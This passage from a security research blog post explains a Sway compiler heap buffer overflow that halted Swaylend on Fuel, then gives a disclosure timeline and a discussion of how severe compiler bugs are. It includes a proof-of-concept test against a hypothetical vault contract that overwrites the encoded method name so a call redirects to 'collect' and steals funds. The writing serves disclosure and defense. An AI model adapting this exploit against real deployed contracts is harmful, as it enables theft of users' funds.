<p>Returning to Swaylend, is this what has happened? Close, but not exactly. It turns out the Fuel team has attempted to fix this bug at one point. In this <a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/commit/090187e76b539fba0cba0160baf7859416e24e77">commit</a>, they added code to double the size of the <code>Buffer</code> whenever it runs out of space. Unfortunately, doubling the buffer size was not enough to fully resolve the bug. Take the failing transaction as example, the final field to serialize is 0xba3 bytes, and the entire <code>param</code> exceeds 0xc00 bytes. Since Doubling the 1024-bytes <code>Buffer</code> to 2048-bytes is not enough to store the entire <code>param</code>, the encoding still overflow into <code>method_name</code>, corrupting it.</p>
<h3 id="The-End-of-the-Story"><a href="#The-End-of-the-Story" class="headerlink" title="The End of the Story?"></a>The End of the Story?</h3><p>Reverting when it shouldn’t is bad enough on its own. But hold on—does an overflow always end with a revert? Let’s consider the bug more carefully. What if attackers craft their overflowing encoded argument carefully to control the <code>method_name</code>, directing it to an existing function rather than some corrupted data? The hypothetical DApp below demonstrates how this could turn the bug into a serious loss-of-funds issue. Readers are encouraged to take some time with this to truly understand how the bug works 0.&lt;</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">contract;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::&#123;</span><br><span class="line">    bytes::Bytes,</span><br><span class="line">    identity::Identity,</span><br><span class="line">    asset::transfer,</span><br><span class="line">    asset_id::AssetId,</span><br><span class="line">    context::this_balance,</span><br><span class="line">    auth::msg_sender,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">abi VaultContract &#123;</span><br><span class="line">    <span class="meta">#[storage(write)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">initialize</span>(manager:Identity);</span><br><span class="line">    <span class="meta">#[payable, storage(read)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">deposit</span>(data: Bytes);</span><br><span class="line">    <span class="meta">#[storage(read)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">collect</span>(amount: <span class="type">u64</span>, receiver: Identity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">storage &#123;</span><br><span class="line">    manager: Identity = Identity::<span class="title function_ invoke__">Address</span>(Address::<span class="title function_ invoke__">zero</span>()),</span><br><span class="line">    initialized: <span class="type">bool</span> = <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">VaultContract</span> <span class="keyword">for</span> <span class="title class_">Contract</span> &#123;</span><br><span class="line">    <span class="meta">#[storage(write)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">initialize</span>(manager: Identity) &#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(storage.initialized.<span class="title function_ invoke__">read</span>() == <span class="literal">false</span>);</span><br><span class="line">        storage.initialized.<span class="title function_ invoke__">write</span>(<span class="literal">true</span>);</span><br><span class="line">        storage.manager.<span class="title function_ invoke__">write</span>(manager);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#[payable, storage(read)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">deposit</span>(data: Bytes) &#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">msg_sender</span>().<span class="title function_ invoke__">unwrap</span>() == storage.manager.<span class="title function_ invoke__">read</span>());</span><br><span class="line">        <span class="comment">//ignore the bookkeeping of user balance since it&#x27;s not important for the poc</span></span><br><span class="line">        <span class="title function_ invoke__">log</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#[storage(read)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">collect</span>(amount: <span class="type">u64</span>, receiver: Identity) &#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">msg_sender</span>().<span class="title function_ invoke__">unwrap</span>() == storage.manager.<span class="title function_ invoke__">read</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">actual_amount</span> = amount;</span><br><span class="line">        <span class="keyword">if</span> (actual_amount &gt; <span class="title function_ invoke__">this_balance</span>(AssetId::<span class="title function_ invoke__">base</span>())) &#123;</span><br><span class="line">            actual_amount = <span class="title function_ invoke__">this_balance</span>(AssetId::<span class="title function_ invoke__">base</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">transfer</span>(receiver, AssetId::<span class="title function_ invoke__">base</span>(), actual_amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">contract;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::&#123;</span><br><span class="line">    bytes::Bytes,</span><br><span class="line">    alloc::alloc,</span><br><span class="line">    asset_id::AssetId,</span><br><span class="line">    registers::global_gas,</span><br><span class="line">    identity::Identity,</span><br><span class="line">    address::Address,</span><br><span class="line">    contract_id::ContractId,</span><br><span class="line">    auth::msg_sender,</span><br><span class="line">    call_frames::msg_asset_id,</span><br><span class="line">    context::&#123;</span><br><span class="line">        msg_amount,</span><br><span class="line">        balance_of,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">abi VaultContract &#123;</span><br><span class="line">    <span class="meta">#[storage(write)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">initialize</span>(manager:Identity);</span><br><span class="line">    <span class="meta">#[payable, storage(read)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">deposit</span>(data: Bytes);</span><br><span class="line">    <span class="meta">#[storage(read)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">collect</span>(amount: <span class="type">u64</span>, receiver: Identity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abi ManagerContract &#123;</span><br><span class="line">    <span class="meta">#[payable]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">deposit</span>(data: Bytes);</span><br><span class="line">    <span class="meta">#[storage(read)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">collect</span>(amount: <span class="type">u64</span>, receiver: Identity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">storage &#123;</span><br><span class="line">    admin: Identity = Identity::<span class="title function_ invoke__">Address</span>(Address::<span class="title function_ invoke__">zero</span>()),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">ManagerContract</span> <span class="keyword">for</span> <span class="title class_">Contract</span> &#123;</span><br><span class="line">    <span class="meta">#[payable]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">deposit</span>(data: Bytes) &#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">msg_asset_id</span>() == AssetId::<span class="title function_ invoke__">base</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">vault_abi</span> = <span class="title function_ invoke__">abi</span>(VaultContract, vault::CONTRACT_ID);</span><br><span class="line">        vault_abi.deposit&#123;asset_id: AssetId::<span class="title function_ invoke__">base</span>().<span class="title function_ invoke__">bits</span>(), coins: <span class="title function_ invoke__">msg_amount</span>()&#125;(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[storage(read)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">collect</span>(amount: <span class="type">u64</span>, receiver: Identity) &#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">msg_sender</span>().<span class="title function_ invoke__">unwrap</span>() == storage.admin.<span class="title function_ invoke__">read</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">vault_abi</span> = <span class="title function_ invoke__">abi</span>(VaultContract, vault::CONTRACT_ID);</span><br><span class="line">        vault_abi.<span class="title function_ invoke__">collect</span>(amount, receiver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[test]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">test</span>() &#123;</span><br><span class="line">   <span class="comment">// setup</span></span><br><span class="line">   <span class="keyword">let</span> <span class="variable">vault_abi</span> = <span class="title function_ invoke__">abi</span>(VaultContract, vault::CONTRACT_ID);</span><br><span class="line">   vault_abi.<span class="title function_ invoke__">initialize</span>(Identity::<span class="title function_ invoke__">ContractId</span>(ContractId::<span class="title function_ invoke__">from</span>(CONTRACT_ID)));</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">manager_abi</span> = <span class="title function_ invoke__">abi</span>(ManagerContract, CONTRACT_ID);</span><br><span class="line">   manager_abi.deposit&#123;asset_id: AssetId::<span class="title function_ invoke__">base</span>().<span class="title function_ invoke__">bits</span>(), coins: <span class="number">100</span>&#125;(Bytes::<span class="title function_ invoke__">new</span>());</span><br><span class="line">   <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">balance_of</span>(ContractId::<span class="title function_ invoke__">from</span>(vault::CONTRACT_ID), AssetId::<span class="title function_ invoke__">base</span>()) == <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// exploit</span></span><br><span class="line">   <span class="keyword">let</span> <span class="variable">arg_len</span> = <span class="number">0x408</span>;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">arg</span> = alloc::&lt;<span class="type">u8</span>&gt;(<span class="number">8</span> + arg_len);</span><br><span class="line">   arg.write::&lt;<span class="type">u64</span>&gt;(arg_len);</span><br><span class="line">   arg.<span class="title function_ invoke__">add_uint_offset</span>(<span class="number">0x3f8</span>).write::&lt;<span class="type">u64</span>&gt;(<span class="number">15</span>); <span class="comment">//overwrite name encode buffer length</span></span><br><span class="line">   arg.<span class="title function_ invoke__">add_uint_offset</span>(<span class="number">0x400</span>).write::&lt;<span class="type">u64</span>&gt;(<span class="number">7</span>); <span class="comment">//overwrite name length</span></span><br><span class="line">   arg.<span class="title function_ invoke__">add_uint_offset</span>(<span class="number">0x408</span>).write::&lt;<span class="type">u64</span>&gt;(<span class="number">0x636f6c6c65637400</span>); <span class="comment">//overwrite name</span></span><br><span class="line">   __contract_call(</span><br><span class="line">       <span class="title function_ invoke__">encode</span>((</span><br><span class="line">           CONTRACT_ID,</span><br><span class="line">           <span class="title function_ invoke__">asm</span>(a:<span class="title function_ invoke__">encode</span>(<span class="string">&quot;deposit&quot;</span>).<span class="title function_ invoke__">ptr</span>())&#123;a:<span class="type">u64</span>&#125;,</span><br><span class="line">           <span class="title function_ invoke__">asm</span>(a:arg)&#123;a:<span class="type">u64</span>&#125;,</span><br><span class="line">       )).<span class="title function_ invoke__">ptr</span>(),</span><br><span class="line">       <span class="number">0</span>, </span><br><span class="line">       AssetId::<span class="title function_ invoke__">base</span>().<span class="title function_ invoke__">bits</span>(),</span><br><span class="line">       <span class="title function_ invoke__">global_gas</span>(),</span><br><span class="line">   );</span><br><span class="line">   <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">balance_of</span>(ContractId::<span class="title function_ invoke__">from</span>(vault::CONTRACT_ID), AssetId::<span class="title function_ invoke__">base</span>()) == <span class="number">100</span>); <span class="comment">//this fails because the overflow stole the coins</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Besides controlling the <code>method_name</code> to redirect code execution, other attack vectors also exist. Since the overflow doesn’t necessarily stop at the <code>method_name</code> buffer, if there is other data placed on the heap before the call, attacker could tamper that as well. The potential of powerful exploits surrounding this bug is truly unlimited.</p>
<p>On the bright side for Swaylend, the <code>Pyth</code> contract they’re calling doesn’t have any functionality that could enable a more severe attack. Additionally, there’s also no useful data on the heap for an attacker to corrupt. This limits the impact of the bug to only transaction failures. However, other DApps may not be as fortunate. Our suggestion to Sway developers is to review your code to ensure there are no dynamic-length arguments passed between contracts. If so, recompile your contract with the latest version of the Sway compiler and upgrade it immediately.</p>
<h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><p>So, what can we learn from the incident, and why do we call this a “preventable” issue?<br>Let’s take a look at the reporting timeline:</p>
<ul>
<li>6&#x2F;19 : We reported the compiler bug to Fuel via Immunefi, but the report was automatically closed because the contest didn’t include an appropriate impact option. The custom impact we provided—“Incorrect Sway intrinsics leading to Fuel heap buffer overflow”—was deemed out of scope</li>
<li>7&#x2F;1  : We reached out to Immunefi and received a response that they would ask Fuel to review the reports that were automatically, but incorrectly, closed</li>
<li>8&#x2F;23 : Long after the end of the Attackathon, we reminded Immunefi and Fuel the report had not been reviewed</li>
<li>8&#x2F;26 : The report was once again automatically closed due to “out of scope” impacts</li>
<li>8&#x2F;30 : The report was accepted, but its severity was downgraded from Critical to Low</li>
<li>8&#x2F;30 : We provided the proof of concept DApp above to strengthen our claim that the bug could have severe impacts, but were unable to convince Fuel and Immunefi to reassess its severity</li>
<li>10&#x2F;31: Two month later, we noticed transactions failing with error code 123 (mismatched selector reverts) </li>
<li>11&#x2F;1 : Swaylend was halted</li>
<li>11&#x2F;3 : Swaylend was recompiled and upgraded in <a target="_blank" rel="noopener" href="https://app.fuel.network/tx/0xe17ffa77accd1b9571a2302672154fc10c59f6f2d52bb0f0a1138f2c071629d1/simple">this transaction</a></li>
</ul>
<p>Compiler bug severities can be a source of contention. The main arguments for assigning a lower severity are:</p>
<ol>
<li>Compiler bugs rarely make it to production. They are typically caught by DApp developers during testing and can easily be identified and fixed.</li>
<li>Compiler bugs don’t have an immediate impact, so by nature, they can’t be considered severe.</li>
<li>It’s uncommon for DApps to encounter compiler bugs, as code that triggers them often involves anti-patterns.</li>
</ol>
<p>On the other hand, the counterarguments for high severity are:</p>
<ol>
<li>It is unreasonable to expect DApp developers to catch compiler bugs during testing. Testing coverage is often insufficient, and even with high coverage, bugs may still go undetected.</li>
<li>Programming languages are meant to provide developers with a trusted foundation. If developers cannot rely on a language to function as intended, building anything useful becomes impossible.</li>
<li>Nearly all miscompilations have the potential to lead to critical consequences. If not taken seriously, it’s only a matter of time before compiler bugs result in significant losses.</li>
</ol>
<p>While the consequences of compiler bugs are still up for debate, we want to highlight that negligence in compiler security has already had visible impacts in the industry. A few well-known examples include:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://hackmd.io/@vyperlang/HJUgNMhs2">The Vyper reentrancy bug</a> &#x3D;&gt; over $26 million stolen.</li>
<li><a target="_blank" rel="noopener" href="https://governance.aave.com/t/bgd-aave-v3-zksync-activation-issue-report/18819">The ZKSync-Aave optimization bug</a> &#x3D;&gt; fortunately identified before activation.</li>
<li><a target="_blank" rel="noopener" href="https://x.com/swaylend/status/1853554438772085138">The Fuel-Swaylend buffer overflow vulnerability</a> &#x3D;&gt; Swaylend halted for 2 days.</li>
</ol>
<p>Although it is common for people to underestimate the potential impact of vulnerabilities yet to occur, recent examples demonstrate our industry has reached a point where imminent threats, such as compiler issues, are looming. A certain portion of related incidents could likely have been avoided if reported vulnerabilities had received more attention and if security researchers had been more actively engaged in the process of reviewing fixes.</p>
<p>Bugs are an inherent part of the development process, and determining the timing and approach for addressing them is a crucial decision. The more seriously security bugs are handled, the less likely they are to come back to bite us later. If you are concerned about compiler bugs affecting your contracts or need help assessing the risks, contact us at <a href="mailto:&#116;&#104;&#51;&#46;&#97;&#110;&#x61;&#x74;&#111;&#x6d;&#x69;&#x73;&#x74;&#64;&#x67;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#116;&#104;&#51;&#46;&#97;&#110;&#x61;&#x74;&#111;&#x6d;&#x69;&#x73;&#x74;&#64;&#x67;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;</a>. We can help you conduct the most thorough and rigorous review.</p>
<p>In our next post, we will dive into the Sway compiler, breaking down the pipeline of modern compilers and examining the bugs we discovered during the Attackathon. Feel free to follow us on <a target="_blank" rel="noopener" href="https://x.com/th3anatomist">X</a> to stay tunned!</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Long-Story-Short"><span class="nav-number">1.</span> <span class="nav-text">Long Story Short</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Incident"><span class="nav-number">2.</span> <span class="nav-text">The Incident</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Discovery"><span class="nav-number">2.1.</span> <span class="nav-text">Discovery</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Investigation"><span class="nav-number">2.2.</span> <span class="nav-text">Investigation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bug-Analysis"><span class="nav-number">2.3.</span> <span class="nav-text">Bug Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-End-of-the-Story"><span class="nav-number">2.4.</span> <span class="nav-text">The End of the Story?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reflection"><span class="nav-number">3.</span> <span class="nav-text">Reflection</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Anatomist</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">1</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Anatomist</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
